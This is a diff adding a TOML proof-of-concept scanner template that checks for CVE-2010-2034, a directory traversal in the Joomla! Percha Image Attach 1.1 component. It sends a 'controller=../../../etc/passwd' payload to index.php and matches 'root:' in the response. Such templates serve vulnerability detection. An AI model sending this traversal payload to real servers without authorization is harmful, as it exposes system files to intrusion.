@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "检测 Joomla! Percha Image Attach 1.1 组件路径遍历漏洞，通过操纵 index.php 页面中的 controller 参数，利用 ../ 目录穿越读取服务器任意文件。该漏洞源于输入验证不足，导致攻击者可直接访问服务器上的任意文件系统路径。"
+id = "POC-AVE-2010-0087"
+name = "CVE-2010-2034 目录遍历 PoC"
+severity = "high"
+tags = ["ave-2010-0087"]
+vuln_id = [
+    "CVE-2010-2034",
+    "AVE-2010-0087",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/index.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "controller=../../../etc/passwd"
+type = "form"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["root:"]
